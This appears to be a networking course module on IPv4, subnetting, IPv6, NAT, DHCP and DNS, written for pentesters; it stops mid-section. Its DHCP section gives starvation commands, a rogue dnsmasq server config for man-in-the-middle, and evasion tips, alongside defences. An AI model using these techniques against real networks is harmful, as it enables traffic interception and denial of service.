---
title: "Module 01 — IP Addressing & Subnetting"
tags: [networking, ip, subnetting, ipv6, nat, dhcp, dns, pentest, netgod]
module: 1
date: 2026-04-05
---

# Module 01 — IP Addressing & Subnetting

> [!info] Module Overview
> This module covers everything about IP addressing — the logical addressing system that makes the internet work. You will understand IPv4 structure from the bit level, subnet by hand without a calculator, work through VLSM, understand IPv6, and know exactly how NAT, DHCP, and DNS operate under the hood. Every concept includes the attacker's perspective.

---

## 1. IPv4 Structure

### What Is an IP Address?

An IPv4 (Internet Protocol version 4) address is a **32-bit number** that uniquely identifies a device on a network. It is written in **dotted-decimal notation** — four groups of 8 bits (octets), each expressed as a decimal number from 0 to 255, separated by dots.

```
192      .    168      .    1        .    100
11000000      10101000      00000001      01100100
  Octet 1      Octet 2       Octet 3       Octet 4
```

Each octet is 8 bits. Four octets = 32 bits total. The total addressable space in IPv4 is 2³² = **4,294,967,296 addresses**.

### Two Parts of an IP Address

Every IPv4 address has two logical parts:
- **Network portion**: Identifies which network the device is on. All devices on the same network share the same network portion.
- **Host portion**: Identifies the specific device within that network.

The **subnet mask** determines where the network portion ends and the host portion begins.

```
IP Address:   192.168.1.100
Subnet Mask:  255.255.255.0

Binary:
IP:   11000000.10101000.00000001.01100100
Mask: 11111111.11111111.11111111.00000000
      |--------Network--------|  |-Host-|

Network: 192.168.1.0
Host:    .100
```

The 1-bits in the mask indicate the network portion. The 0-bits indicate the host portion.

### IPv4 Address Classes (Classful Addressing — Legacy)

Before CIDR (Classless Inter-Domain Routing) was introduced in 1993, IPv4 was divided into fixed classes. You still encounter this terminology constantly in documentation and exams.

| Class | First Octet Range | Default Mask | Network Bits | Host Bits | Hosts Per Network | Purpose |
|-------|------------------|--------------|-------------|-----------|------------------|---------|
| A | 1–126 | 255.0.0.0 (/8) | 8 | 24 | 16,777,214 | Large organisations, ISPs |
| B | 128–191 | 255.255.0.0 (/16) | 16 | 16 | 65,534 | Medium organisations |
| C | 192–223 | 255.255.255.0 (/24) | 24 | 8 | 254 | Small networks |
| D | 224–239 | N/A | N/A | N/A | N/A | Multicast |
| E | 240–255 | N/A | N/A | N/A | N/A | Reserved/experimental |

> [!info] Why 127 is Missing
> The 127.0.0.0/8 range is reserved for **loopback** — traffic sent to any 127.x.x.x address loops back to the local machine. `127.0.0.1` is the standard loopback address (`localhost`). This means Class A technically starts at 1.0.0.0 and ends at 126.255.255.255.

**Hosts per network formula**: 2^(host bits) - 2
Subtract 2 because:
- The first address (all host bits = 0) is the **network address** — identifies the network itself, cannot be assigned to a host
- The last address (all host bits = 1) is the **broadcast address** — traffic sent here goes to all hosts on the subnet

### Private IP Address Ranges (RFC 1918)

These ranges are not routed on the public internet. Routers on the internet will drop packets with these source/destination addresses. They are used internally within organisations and translated to public IPs at the perimeter (NAT).

| Class | Private Range | CIDR | Addresses |
|-------|--------------|------|-----------|
| A | 10.0.0.0 – 10.255.255.255 | 10.0.0.0/8 | 16,777,216 |
| B | 172.16.0.0 – 172.31.255.255 | 172.16.0.0/12 | 1,048,576 |
| C | 192.168.0.0 – 192.168.255.255 | 192.168.0.0/16 | 65,536 |

> [!tip] Pentester Context
> When you land on an internal machine and run `ipconfig` or `ip a`, a 10.x.x.x, 172.16-31.x.x, or 192.168.x.x address tells you you're on a private network behind NAT. Your next step: enumerate what other subnets exist, what the gateway is, and whether you can reach other RFC 1918 ranges (indicating multiple network segments or pivot opportunities).

### Other Special IPv4 Ranges

| Range | Purpose |
|-------|---------|
| 0.0.0.0/8 | "This" network (used in routing when the network is not yet known) |
| 127.0.0.0/8 | Loopback — traffic stays on local host |
| 169.254.0.0/16 | APIPA (Automatic Private IP Addressing) — assigned when DHCP fails. If you see this, the device couldn't reach a DHCP server. |
| 224.0.0.0/4 | Multicast (Class D) |
| 255.255.255.255 | Limited broadcast — sent to all hosts on the local subnet, not forwarded by routers |

---

## 2. Subnet Masks, CIDR, and Wildcard Masks

### Subnet Masks

A subnet mask is a 32-bit number where all network bits are 1 and all host bits are 0. Written in the same dotted-decimal notation as an IP address.

```
255.255.255.0  =  11111111.11111111.11111111.00000000
255.255.0.0    =  11111111.11111111.00000000.00000000
255.0.0.0      =  11111111.00000000.00000000.00000000
255.255.255.128=  11111111.11111111.11111111.10000000
```

### CIDR Notation

CIDR (Classless Inter-Domain Routing) notation expresses the subnet mask as a prefix length — a `/` followed by the number of 1-bits in the mask.

```
192.168.1.0/24  →  255.255.255.0    (24 ones, 8 zeros)
10.0.0.0/8      →  255.0.0.0        (8 ones, 24 zeros)
172.16.0.0/12   →  255.240.0.0      (12 ones, 20 zeros)
192.168.1.128/25 → 255.255.255.128  (25 ones, 7 zeros)
```

CIDR allows subnetting at any bit boundary, not just the class boundaries. This is what enables efficient IP address allocation.

**Complete CIDR reference table for /24 and smaller** (most common in practice):

| CIDR | Subnet Mask | Network Bits | Host Bits | Usable Hosts | Subnets from /24 |
|------|------------|-------------|-----------|-------------|-----------------|
| /24 | 255.255.255.0 | 24 | 8 | 254 | 1 |
| /25 | 255.255.255.128 | 25 | 7 | 126 | 2 |
| /26 | 255.255.255.192 | 26 | 6 | 62 | 4 |
| /27 | 255.255.255.224 | 27 | 5 | 30 | 8 |
| /28 | 255.255.255.240 | 28 | 4 | 14 | 16 |
| /29 | 255.255.255.248 | 29 | 3 | 6 | 32 |
| /30 | 255.255.255.252 | 30 | 2 | 2 | 64 |
| /31 | 255.255.255.254 | 31 | 1 | 2* | 128 |
| /32 | 255.255.255.255 | 32 | 0 | 1 (host route) | 256 |

> [!tip] /30 and /31 Special Cases
> **/30** is the classic point-to-point link subnet — exactly 2 usable hosts, perfect for connecting two routers.
> **/31** (RFC 3021) — a special case where there is no network/broadcast address. Both addresses are usable for the two endpoints of a point-to-point link. Used on carrier networks to conserve IPs. Some older equipment doesn't support it.
> **/32** — a host route. Refers to exactly one IP. Used in routing tables to specify a single host, in loopback configurations, and in firewall rules.

### Wildcard Masks

A wildcard mask is the **inverse of a subnet mask** — 0-bits mean "must match," 1-bits mean "don't care." Used in Cisco ACLs and OSPF network statements.

```
Subnet mask:   255.255.255.0   =  11111111.11111111.11111111.00000000
Wildcard mask: 0.0.0.255       =  00000000.00000000.00000000.11111111

To calculate wildcard: subtract subnet mask from 255.255.255.255
255.255.255.255
-255.255.255.0
= 0.0.0.255
```

**ACL example — permit traffic from the 192.168.1.0/24 network**:
```cisco
access-list 10 permit 192.168.1.0 0.0.0.255
```
The `0.0.0.255` wildcard means: the first three octets must match exactly (0 = must match), the last octet can be anything (255 = don't care).

**OSPF network statement example**:
```cisco
router ospf 1
 network 192.168.1.0 0.0.0.255 area 0
```

---

## 3. Subnetting by Hand

This is the most critical practical skill in networking. You must be able to subnet without a calculator — in exams, on engagements, and during live troubleshooting.

### The Core Method

Given an IP address and mask, find:
1. Network address (first address in the subnet)
2. Broadcast address (last address in the subnet)
3. First usable host address
4. Last usable host address
5. Number of usable hosts

**The "magic number" method**:

The magic number is `256 - (last non-255 octet of the subnet mask)`.
The subnets increment by the magic number in the interesting octet.

### Worked Example 1 — /26 (255.255.255.192)

**Given**: `192.168.10.130/26`

Step 1: Identify the interesting octet
```
Mask: 255.255.255.192
The last octet (192) is neither 255 nor 0 — this is the interesting octet (4th octet)
```

Step 2: Calculate the magic number (block size)
```
256 - 192 = 64
Subnets increment by 64 in the 4th octet
```

Step 3: List subnet boundaries
```
192.168.10.0    ← First subnet starts at 0
192.168.10.64   ← Second subnet (0 + 64)
192.168.10.128  ← Third subnet (64 + 64)  ← Our IP 130 falls here
192.168.10.192  ← Fourth subnet (128 + 64)
192.168.10.256  ← Would overflow — /26 gives exactly 4 subnets in a /24
```

Step 4: The subnet our IP (130) falls in starts at 128
```
Network address:     192.168.10.128
Broadcast address:   192.168.10.191  (next subnet start - 1 = 192 - 1 = 191)
First usable host:   192.168.10.129
Last usable host:    192.168.10.190
Usable hosts:        62  (2^6 - 2 = 62)
```

### Worked Example 2 — /22 (Interesting octet is 3rd)

**Given**: `172.16.50.200/22`

Step 1: Mask in dotted decimal
```
/22 = 11111111.11111111.11111100.00000000 = 255.255.252.0
Interesting octet: 3rd (252)
```

Step 2: Magic number
```
256 - 252 = 4
Subnets increment by 4 in the 3rd octet
```

Step 3: Subnet boundaries (3rd octet)
```
172.16.0.0
172.16.4.0
172.16.8.0
...
172.16.48.0
172.16.52.0  ← Our IP 172.16.50.200 — 50 falls between 48 and 52
```

Step 4: Results
```
Network address:     172.16.48.0
Broadcast address:   172.16.51.255
First usable host:   172.16.48.1
Last usable host:    172.16.51.254
Usable hosts:        1022  (2^10 - 2 = 1022)
```

### Worked Example 3 — Designing Subnets for a Requirement

**Scenario**: You need to create subnets from 10.10.0.0/16 for the following:
- VLAN 10 (EPOS tills): 50 hosts
- VLAN 20 (Staff PCs): 200 hosts
- VLAN 30 (Servers): 10 hosts
- VLAN 40 (Management): 2 hosts (point-to-point)

**Step 1**: Determine the minimum prefix for each requirement:
| VLAN | Hosts Needed | Host Bits Required | Prefix | Usable Hosts |
|------|-------------|-------------------|--------|-------------|
| 20 (Staff) | 200 | 8 bits (2^8-2=254) | /24 | 254 |
| 10 (EPOS) | 50 | 6 bits (2^6-2=62) | /26 | 62 |
| 30 (Servers) | 10 | 4 bits (2^4-2=14) | /28 | 14 |
| 40 (Mgmt) | 2 | 2 bits (2^2-2=2) | /30 | 2 |

**Step 2**: Assign subnets (start with the largest to avoid fragmentation):
```
10.10.1.0/24   → VLAN 20 Staff (254 hosts)
10.10.2.0/26   → VLAN 10 EPOS  (62 hosts, starts after the /24)
10.10.2.64/28  → VLAN 30 Servers (14 hosts)
10.10.2.80/30  → VLAN 40 Management (2 hosts)
```

This is VLSM — Variable Length Subnet Masking.

---

## 4. VLSM — Variable Length Subnet Masking

VLSM allows you to use **different subnet masks within the same network**, allocating exactly as much address space as needed to each subnet instead of wasting IPs with fixed-size subnets.

**Why VLSM exists**:
Pre-VLSM, if you needed a point-to-point link between two routers (2 hosts needed), you'd have to allocate an entire /24 (254 usable hosts) — wasting 252 addresses. With VLSM, you allocate a /30 (2 usable hosts) and waste nothing.

**VLSM Rule**: Always subnet largest-first. This prevents overlapping allocations and ensures efficient use of the address space.

**The golden rule**: After allocating a subnet, the next subnet must start on a boundary that is a multiple of its block size.

```
After allocating 10.10.1.0/24 (block size 256):
Next available: 10.10.2.0

After allocating 10.10.2.0/26 (block size 64):
Next available: 10.10.2.64

After allocating 10.10.2.64/28 (block size 16):
Next available: 10.10.2.80

After allocating 10.10.2.80/30 (block size 4):
Next available: 10.10.2.84
```

---

## 5. IPv6

IPv4 exhaustion is real — IANA distributed the last /8 blocks to RIRs in 2011. IPv6 is the long-term solution, now widely deployed.

### IPv6 Address Structure

IPv6 addresses are **128 bits** long, written as **8 groups of 4 hexadecimal digits**, separated by colons:

```
2001:0db8:85a3:0000:0000:8a2e:0370:7334
```

Total address space: 2¹²⁸ ≈ 3.4 × 10³⁸ — effectively unlimited for the foreseeable future.

### Notation Shortcuts

**Rule 1 — Leading zeros can be omitted within each group**:
```
2001:0db8:85a3:0000:0000:8a2e:0370:7334
→ 2001:db8:85a3:0:0:8a2e:370:7334
```

**Rule 2 — One consecutive run of all-zero groups can be replaced with `::`**:
```
2001:db8:85a3:0:0:8a2e:370:7334
→ 2001:db8:85a3::8a2e:370:7334
```

`::` can only appear **once** in an address — otherwise it's ambiguous how many zero groups it represents.

**The loopback address**: `::1` (equivalent to IPv4's 127.0.0.1)
**Unspecified address**: `::` (all zeros — equivalent to 0.0.0.0)

### IPv6 Address Types

| Type | Prefix | Description | IPv4 Equivalent |
|------|--------|-------------|----------------|
| Global Unicast | 2000::/3 | Globally routable, internet-facing | Public IPv4 |
| Unique Local | FC00::/7 | Private, not routed on internet. FD00::/8 is the commonly used range. | RFC 1918 |
| Link-Local | FE80::/10 | Auto-configured, only valid on the local link. Every IPv6 interface gets one. | 169.254.0.0/16 |
| Multicast | FF00::/8 | One-to-many delivery | 224.0.0.0/4 |
| Loopback | ::1/128 | Local host only | 127.0.0.1 |
| Solicited-Node Multicast | FF02::1:FF00:0/104 | Used by NDP (replaces ARP in IPv6) | N/A |

### Link-Local Addresses — Important Detail

Every IPv6-enabled interface **automatically generates** a link-local address (FE80::/10) using EUI-64 or random assignment, without any DHCP. This means:
- IPv6 is often active on interfaces even if you haven't explicitly configured it
- Link-local addresses are used for neighbour discovery and routing protocol communications
- From a pentest perspective: even if you don't see a global IPv6 address, link-local may be active and usable within the local segment

### EUI-64 — Interface Identifier Generation

EUI-64 generates the 64-bit host portion of a link-local (or stateless autoconfigured global) address from the interface's MAC address.

**Process**:
1. Take the MAC address: `AA:BB:CC:DD:EE:FF`
2. Split it in half: `AA:BB:CC` | `DD:EE:FF`
3. Insert `FF:FE` in the middle: `AA:BB:CC:FF:FE:DD:EE:FF`
4. Flip the 7th bit (the Universal/Local bit) of the first byte:
   - `AA` = `10101010` — the 7th bit (from left, 0-indexed) is bit 1: `10101010` → flip bit 1 → `10101000` = `A8`
5. Result: `A8:BB:CC:FF:FE:DD:EE:FF`
6. Write as IPv6: `A8BB:CCFF:FEDD:EEFF`
7. Prepend link-local prefix: `FE80::A8BB:CCFF:FEDD:EEFF`

> [!warning] EUI-64 Privacy Issue
> EUI-64-derived addresses embed the MAC address — meaning anyone who sees your IPv6 address can identify your NIC manufacturer and potentially track your device across networks. This led to RFC 4941 (Privacy Extensions), which generates random interface IDs instead. Windows uses privacy extensions by default. Many Linux distros also do now.

### IPv6 Prefix Notation

IPv6 uses the same CIDR-style prefix notation. The prefix identifies the network portion:

```
2001:db8::/32    →  ISP allocation
2001:db8:1::/48  →  Organisation allocation
2001:db8:1:1::/64 → Single subnet (typical end-user subnet size)
```

The /64 boundary is special in IPv6 — SLAAC (Stateless Address Autoconfiguration) requires a /64 prefix for the host to generate its own address using EUI-64 or random methods.

### Dual-Stack

Dual-stack means a device runs both IPv4 and IPv6 simultaneously — the normal transition approach. The device has both an IPv4 and IPv6 address, and applications can use either.

```bash
# Check dual-stack on Linux
ip a show eth0
# You'll see both inet (IPv4) and inet6 (IPv6) lines

# Check on Windows
ipconfig /all
# Shows both IPv4 and IPv6 addresses per adapter
```

> [!danger] IPv6 Pentest Blind Spot
> Many organisations have deployed IPv4 security controls (firewalls, IDS, ACLs) but have not applied equivalent controls to IPv6. If IPv6 is active on the network (even just link-local), an attacker who can send IPv6 traffic may bypass IPv4-only firewalls entirely. Always check for IPv6 during an engagement.

---

## 6. NAT — Network Address Translation

NAT translates IP addresses in packet headers as they pass through a router or firewall. Its primary purpose was to conserve the exhausted IPv4 address space by allowing many private IP addresses to share one public IP.

### Why NAT Exists

An organisation receives one public IP from their ISP. Internally, they have 500 devices. Without NAT, every device needs its own public IP — impossible. With NAT, all 500 devices share the single public IP, with the NAT device tracking which internal host corresponds to each outbound connection.

### Three Types of NAT

#### Static NAT (One-to-One)

Maps one private IP permanently to one public IP. Every packet from the private IP is translated to the same public IP, and vice versa.

**Use case**: A web server behind NAT that must be reachable from the internet on a specific public IP.

```cisco
! Cisco IOS — Static NAT
interface GigabitEthernet0/0
 ip address 203.0.113.1 255.255.255.0
 ip nat outside

interface GigabitEthernet0/1
 ip address 192.168.1.1 255.255.255.0
 ip nat inside

! Static translation: 192.168.1.10 always appears as 203.0.113.10
ip nat inside source static 192.168.1.10 203.0.113.10
```

#### Dynamic NAT (Pool-Based)

Maps private IPs to a pool of public IPs dynamically. When an internal host initiates traffic, it gets assigned a public IP from the pool. When the session ends, the public IP returns to the pool.

**Limitation**: If all public IPs in the pool are in use, new connections are dropped. One public IP per active session — still requires many public IPs.

```cisco
! Define the pool of public IPs
ip nat pool MYPOOL 203.0.113.10 203.0.113.20 netmask 255.255.255.0

! Define which internal IPs get translated (ACL 1 matches all RFC 1918)
access-list 1 permit 192.168.1.0 0.0.0.255

! Apply NAT — translate source IPs matching ACL 1 using MYPOOL
ip nat inside source list 1 pool MYPOOL
```

#### PAT — Port Address Translation (NAT Overload)

PAT is what virtually every home router and most enterprise edge routers use. Many private IPs map to a single public IP, distinguished by unique source port numbers.

**How it works**:
1. Host `192.168.1.50` initiates HTTP to `93.184.216.34:80` using source port `54231`
2. The NAT router translates: source IP `192.168.1.50:54231` → `203.0.113.1:2001` (assigns a unique port from its table)
3. Reply arrives at `203.0.113.1:2001` — NAT router looks up port 2001 in its translation table → forwards to `192.168.1.50:54231`

**NAT translation table entry**:
```
Protocol | Inside Local         | Inside Global        | Outside Global
TCP      | 192.168.1.50:54231  | 203.0.113.1:2001    | 93.184.216.34:80
TCP      | 192.168.1.51:48720  | 203.0.113.1:2002    | 8.8.8.8:53
UDP      | 192.168.1.52:5353   | 203.0.113.1:2003    | 8.8.8.8:53
```

```cisco
! PAT configuration — overload keyword enables PAT
ip nat inside source list 1 interface GigabitEthernet0/0 overload
```

### NAT Terminology

| Term | Meaning |
|------|---------|
| Inside Local | Private IP of the internal host (192.168.x.x) |
| Inside Global | Public IP that represents the internal host to the outside world |
| Outside Local | IP of the external host as seen from inside (usually same as Outside Global) |
| Outside Global | Real public IP of the external host |

### Verifying NAT on Cisco IOS

```cisco
! Show active NAT translations
show ip nat translations

! Show NAT statistics (hits, misses, expired entries)
show ip nat statistics

! Debug NAT in real time (use with care on production)
debug ip nat
```

### Port Forwarding (Static PAT)

Maps an external public IP:port to a specific internal host:port. Allows inbound connections to reach internal servers.

```cisco
! Forward external TCP 80 to internal web server 192.168.1.10:80
ip nat inside source static tcp 192.168.1.10 80 203.0.113.1 80

! Forward external TCP 3389 (RDP) to internal server
ip nat inside source static tcp 192.168.1.20 3389 203.0.113.1 3389
```

### Pentest Lens — NAT

**Attacker's view**: NAT hides internal network topology. From the outside, you only see the public IP(s). Getting behind NAT (via a compromised internet-facing host, VPN, or phishing) reveals the full internal topology.

**Enumeration**:
```bash
# Once inside a NAT'd network, identify the gateway/NAT device
ip route show        # Linux: find default gateway
route print          # Windows: find default gateway
arp -a               # Show ARP table — gateway MAC tells you gateway IP
traceroute 8.8.8.8   # First hop is the NAT device

# Identify NAT device type from TTL and banner
nmap -sV <gateway-ip>
```

**Misconfigurations**:
- Overly permissive port forwarding rules — forwarding RDP (3389) or SSH (22) directly to internal hosts from the internet
- NAT device itself running a vulnerable web management interface exposed on the public IP
- Double NAT (two layers of NAT) without proper port forwarding — breaks VPNs and some applications, but also complicates tracking

**Exploitation**:
- NAT traversal techniques: STUN, TURN — used by VoIP and WebRTC to punch through NAT. Attackers can abuse these to establish outbound connections through firewalls.
- NAT pinning: tricking a browser into making the NAT device open a port to the attacker (old FTP ALG abuse, largely mitigated)
- IPv6 bypass: if IPv6 is active and the NAT device only NATtes IPv4, IPv6 traffic may reach internal hosts directly

**Defender's counter**:
- Only forward specific required ports — no wildcard forwarding
- Apply egress filtering — internal hosts should only be able to initiate traffic to approved external destinations
- Disable IPv6 if not in use (or apply equivalent IPv6 ACLs/firewall rules)

---

## 7. DHCP — Dynamic Host Configuration Protocol

DHCP automatically assigns IP configuration to devices on a network. Without DHCP, every device would need manual IP configuration — impractical at scale.

### What DHCP Assigns

- IP address
- Subnet mask
- Default gateway (option 3)
- DNS server(s) (option 6)
- Domain name (option 15)
- WINS server (option 44) — legacy
- Lease time (how long the device keeps the IP before renewing)

### The DORA Process (DHCP 4-Way Handshake)

DORA = Discover, Offer, Request, Acknowledge

```
Client                                     DHCP Server
  |                                              |
  |--- DHCPDISCOVER (broadcast) --------------->|
  |    Src: 0.0.0.0:68  Dst: 255.255.255.255:67|
  |    "I need an IP address!"                  |
  |                                              |
  |<-- DHCPOFFER (broadcast or unicast) --------|
  |    "I offer you 192.168.1.100 for 24 hours" |
  |    Includes: IP, mask, GW, DNS, lease time  |
  |                                              |
  |--- DHCPREQUEST (broadcast) --------------->|
  |    "I formally request 192.168.1.100"       |
  |    (Broadcast so other DHCP servers know)   |
  |                                              |
  |<-- DHCPACK (broadcast or unicast) ----------|
  |    "Confirmed. 192.168.1.100 is yours."     |
  |    Final confirmation with all options      |
```

**Why broadcast?**
- At the time of DISCOVER, the client has no IP — it cannot unicast. It must broadcast.
- The REQUEST is broadcast even though the client already received an OFFER — this informs any other DHCP servers on the segment that their offer was not chosen, so they can reclaim the offered IP.

**Ports**:
- Client sends from UDP port 68
- Server receives on UDP port 67
- Server sends from UDP port 67
- Client receives on UDP port 68

### DHCP Lease Process — Detail

When the client gets an IP, it receives a **lease time**. Before the lease expires, the client attempts renewal:
- At **50% of lease time**: Client sends a DHCPREQUEST directly (unicast) to the server that issued the lease. If the server responds with DHCPACK, the lease is renewed.
- At **87.5% of lease time**: If renewal at 50% failed, client broadcast-requests again (any server can respond).
- At **100% of lease time**: If still no renewal, the client abandons the IP and starts DORA from scratch.

```bash
# Force DHCP release and renew on Windows
ipconfig /release
ipconfig /renew

# On Linux (NetworkManager)
nmcli con down eth0 && nmcli con up eth0

# On Linux (dhclient directly)
dhclient -r eth0   # Release
dhclient eth0      # Renew
```

### DHCP Relay Agent

DHCP relies on broadcasts, but routers don't forward broadcasts between subnets. In a multi-subnet environment, you need a **DHCP relay agent** (also called ip helper-address on Cisco) to forward DHCP broadcasts from clients to a centralised DHCP server.

```cisco
! On the router interface facing the client subnet
interface GigabitEthernet0/1
 ip address 192.168.10.1 255.255.255.0
 ip helper-address 10.0.0.10    ! DHCP server IP — relay broadcasts here
```

The relay converts the broadcast DISCOVER into a unicast packet addressed to the DHCP server, adding the **giaddr** (Gateway Interface Address) field so the server knows which subnet the request came from and assigns an IP from the correct scope.

### Windows DHCP Server — Key Configuration

```powershell
# Install DHCP role (Windows Server)
Install-WindowsFeature -Name DHCP -IncludeManagementTools

# Create a new scope
Add-DhcpServerv4Scope -Name "Office LAN" -StartRange 192.168.1.100 `
  -EndRange 192.168.1.200 -SubnetMask 255.255.255.0

# Set options for the scope
Set-DhcpServerv4OptionValue -ScopeId 192.168.1.0 `
  -Router 192.168.1.1 `          # Option 3 — Default Gateway
  -DnsServer 192.168.1.10 `      # Option 6 — DNS
  -DnsDomain "corp.local"        # Option 15 — Domain Name

# Create a reservation (always give same IP to a device)
Add-DhcpServerv4Reservation -ScopeId 192.168.1.0 `
  -IPAddress 192.168.1.50 `
  -ClientId "AA-BB-CC-DD-EE-FF" ` # MAC address
  -Description "Print Server"

# View active leases
Get-DhcpServerv4Lease -ScopeId 192.168.1.0
```

### DHCP Snooping

DHCP snooping is a switch security feature that prevents rogue DHCP servers on untrusted ports.

**How it works**:
- Ports are classified as **trusted** (uplinks to legitimate DHCP servers/routers) or **untrusted** (access ports to end devices)
- On untrusted ports: DHCPOFFER and DHCPACK packets are blocked (only servers send these)
- On trusted ports: all DHCP traffic is allowed

```cisco
! Enable DHCP snooping globally
ip dhcp snooping

! Enable on VLAN 10
ip dhcp snooping vlan 10

! Mark the uplink to the DHCP server as trusted
interface GigabitEthernet0/1
 ip dhcp snooping trust

! Untrusted ports are default — no command needed
! Rate-limit DHCP on untrusted ports (prevents DHCP starvation)
interface GigabitEthernet0/2
 ip dhcp snooping limit rate 15    ! Max 15 DHCP packets per second
```

### Pentest Lens — DHCP

**Attacker's view**: DHCP is unauthenticated by default. Anyone on the network can send DHCP packets. Two primary attacks:

**DHCP Starvation**:
Send large numbers of DHCPDISCOVER packets with spoofed MAC addresses, exhausting the DHCP pool. Legitimate clients can't get an IP.

```bash
# Tool: yersinia
yersinia dhcp -attack 1    # DHCP starvation attack

# Or: dhcpstarv
dhcpstarv -i eth0
```

**Rogue DHCP Server**:
After starvation (or independently), stand up your own DHCP server. Clients that can't get a legitimate address will accept your rogue offer. You can now hand out:
- Your machine as the default gateway → man-in-the-middle all traffic
- Your machine as the DNS server → DNS hijacking, redirect to phishing pages

```bash
# Set up rogue DHCP with dnsmasq
apt install dnsmasq
cat > /etc/dnsmasq.conf << EOF
interface=eth0
dhcp-range=192.168.1.200,192.168.1.250,12h
dhcp-option=3,192.168.1.99    # Rogue gateway (attacker's IP)
dhcp-option=6,192.168.1.99    # Rogue DNS (attacker's IP)
EOF
systemctl start dnsmasq
```

**Misconfigurations**:
- No DHCP snooping → rogue DHCP trivially possible
- Excessively long lease times → stale leases, IP conflicts hard to resolve
- DHCP logging not enabled → no visibility on lease history for forensics

**Detection evasion**:
- Use small spoofed MAC pools for starvation to reduce log noise
- Time the rogue DHCP to respond faster than the legitimate server

**Defender's counter**:
- Enable DHCP snooping on all switches
- Rate-limit DHCP on access ports
- Monitor DHCP logs for unexpected servers (Windows DHCP server logs to Event Log and a dedicated log file at `C:\Windows\System32\dhcp\`)
- 802.1X port authentication — only authenticated devices get on the network

---

## 8. DNS — Domain Name System

DNS translates human-readable domain names (e.g., `www.google.com`) into IP addresses (e.g., `142.250.200.4`) that the network can route. It is one of the most critical and most attacked protocols in networking.

### DNS Hierarchy

DNS is a distributed, hierarchical database. The hierarchy has three levels:

```
                     . (Root)
                    /|\
                   / | \
                 com org uk
                /       \
            google      co.uk
               |           |
             www          bbc
```

- **Root servers**: 13 sets of root servers (labeled A through M) managed by different organisations. They know where the TLD servers are.
- **TLD (Top-Level Domain) servers**: Manage `.com`, `.org`, `.uk`, etc. They know where authoritative servers for each domain are.
- **Authoritative servers**: Hold the actual DNS records for a domain. Managed by the domain owner (or their DNS provider).
- **Recursive resolvers (caching resolvers)**: Your ISP's or organisation's DNS server. It does the legwork of querying the hierarchy and caches results.

### DNS Resolution — Recursive vs Iterative

**Recursive resolution** (what your DNS resolver does on your behalf):

```
Your PC → Recursive Resolver: "What is the IP for www.google.com?"
  Recursive Resolver → Root Server: "Who handles .com?"
    Root Server → Recursive Resolver: "The .com TLD server is at 192.5.6.30"
  Recursive Resolver → .com TLD Server: "Who handles google.com?"
    TLD Server → Recursive Resolver: "Google's authoritative server is at 216.239.32.10"
  Recursive Resolver → Google's Auth Server: "What is www.google.com?"
    Auth Server → Recursive Resolver: "www.google.com = 142.250.200.4, TTL 300"
  Recursive Resolver → Your PC: "www.google.com = 142.250.200.4"
```

The resolver does all the work. Your PC just asks and waits.

**Iterative resolution** (the resolver querying the hierarchy):

In the above, every query from the resolver to external servers is iterative — each server either answers directly or refers to the next server in the hierarchy. The resolver then makes a new query to that referred server itself.

### DNS Record Types

| Record Type | Purpose | Example |
|-------------|---------|---------|
| A | Maps hostname to IPv4 address | `www.example.com → 93.184.216.34` |
| AAAA | Maps hostname to IPv6 address | `www.example.com → 2606:2800:220:1:248:1893:25c8:1946` |
| CNAME | Canonical name — alias for another hostname | `mail.example.com → ghs.google.com` |
| MX | Mail exchanger — which server handles email for the domain | `example.com → 10 mail.example.com` (priority 10) |
| NS | Name server — authoritative DNS servers for the domain | `example.com → ns1.example.com` |
| PTR | Reverse DNS — maps IP to hostname (reverse of A record) | `34.216.184.93.in-addr.arpa → www.example.com` |
| SOA | Start of Authority — administrative info for a zone | Primary NS, admin email, serial, refresh timers |
| TXT | Arbitrary text — used for SPF, DKIM, DMARC, domain verification | `v=spf1 include:_spf.google.com ~all` |
| SRV | Service record — specifies server for a specific service | `_ldap._tcp.example.com → 0 100 389 dc01.example.com` |
| CAA | Certification Authority Authorization — which CAs can issue certs | `example.com → letsencrypt.org` |

### DNS in Active Directory

AD-integrated DNS is critical to understand for Windows pentesting. AD uses SRV records to locate domain services:

```
_ldap._tcp.dc._msdcs.corp.local   → Domain Controllers (LDAP)
_kerberos._tcp.corp.local          → KDC (Kerberos Key Distribution Centre)
_gc._tcp.corp.local                → Global Catalog servers
```

When a client joins a domain or logs in, it queries DNS for these SRV records to find DCs. This is why DNS must be working correctly for AD to function.

### DNS Query and Response Structure

DNS uses **UDP port 53** for queries (fast, stateless). Falls back to **TCP port 53** for:
- Responses exceeding 512 bytes (or 4096 bytes with EDNS0)
- Zone transfers (AXFR/IXFR) — always TCP

**DNS packet structure** (simplified):
```
Transaction ID: 0x1234          (matches query to response)
Flags: 0x0100                   (QR=0 query, RD=1 recursion desired)
Questions: 1
Answers: 0
Question:
  QNAME: www.google.com
  QTYPE: A (1)
  QCLASS: IN (1 = Internet)
```

### DNS Query Commands

```bash
# Basic A record lookup
nslookup www.google.com
nslookup www.google.com 8.8.8.8    # Query specific DNS server

# dig — more detailed, preferred for diagnosis
dig www.google.com                  # A record
dig www.google.com AAAA             # IPv6
dig google.com MX                   # Mail servers
dig google.com NS                   # Name servers
dig google.com TXT                  # SPF, DKIM etc
dig -x 93.184.216.34                # Reverse DNS (PTR lookup)
dig @8.8.8.8 www.google.com         # Query specific DNS server
dig google.com ANY                  # All records (often blocked now)

# host — simpler
host www.google.com
host -t MX google.com
host -t NS google.com
host 93.184.216.34                  # Reverse lookup

# Check authoritative NS and query it directly
dig NS example.com
dig @ns1.example.com example.com ANY
```

### DNS Caching and TTL

Every DNS record has a **TTL (Time to Live)** value in seconds. Resolvers cache records for the TTL duration, avoiding repeated lookups. After TTL expires, the resolver queries again.

```bash
# See TTL in dig output:
dig www.google.com
# Answer section shows: www.google.com. 299 IN A 142.250.200.4
#                                        ^^^
#                                        299 seconds remaining on cache
```

**Implications**:
- Short TTL (< 300s): Frequent DNS lookups — more traffic, but changes propagate quickly. Used during migrations.
- Long TTL (3600–86400s): Less lookup traffic, but changes are slow to propagate globally. After a DNS record change, old IPs are cached until TTL expires.

### DNSSEC — DNS Security Extensions

DNSSEC adds **cryptographic signatures** to DNS records, allowing resolvers to verify that a response is authentic and hasn't been tampered with.

**How it works**:
- The zone owner signs their DNS records with a private key
- The public key is published as a DNSKEY record
- Resolvers verify the signature on records they receive
- The chain of trust goes all the way back to the DNSSEC-signed root zone

**DNSSEC does NOT encrypt DNS** — it only provides authentication. DNS traffic is still plaintext and visible on the wire. DNS over HTTPS (DoH) and DNS over TLS (DoT) encrypt DNS traffic.

```bash
